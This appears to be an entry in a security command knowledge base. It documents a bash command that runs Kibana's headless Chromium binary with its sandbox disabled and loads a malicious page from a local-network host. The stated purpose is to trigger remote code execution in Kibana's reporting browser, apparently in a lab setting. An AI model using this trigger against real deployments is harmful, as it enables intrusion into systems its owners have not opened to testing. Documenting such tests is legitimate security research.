---
data: './headless_shell --no-sandbox http://192.168.0.154:8009/alexb-says-hi.html'
tags:
  - chromium
  - rce-trigger
type: command
output: 'Warnings about locale_file_path, then RCE execution; interrupt with CTRL-C'
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:37.206Z'
id: 762a2d86-3f6c-4b7e-a286-d73245dd64e6
verified: false
validated: true
submitted: true
---
# headless-shell-load-url

## Command

```bash
./headless_shell --no-sandbox http://192.168.0.154:8009/alexb-says-hi.html
```

## Description

Executes the headless Chromium binary without sandboxing to load a malicious URL, triggering RCE exploits in Kibana's reporting browser.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--no-sandbox` | Disables security sandbox, enabling exploits | Yes |
| URL | Malicious HTML endpoint | Yes |

## Examples

### Basic Usage

```bash
./headless_shell --no-sandbox http://192.168.0.154:8009/alexb-says-hi.html
```

## Expected Output

Browser startup warnings, then silent RCE execution (e.g., file write); process hangs until interrupted.

## Related

- [[commands/docker-run-kibana-bash]]
- [[procedures/Run-Kibana-Docker-Container-and-Test-Chromium]]
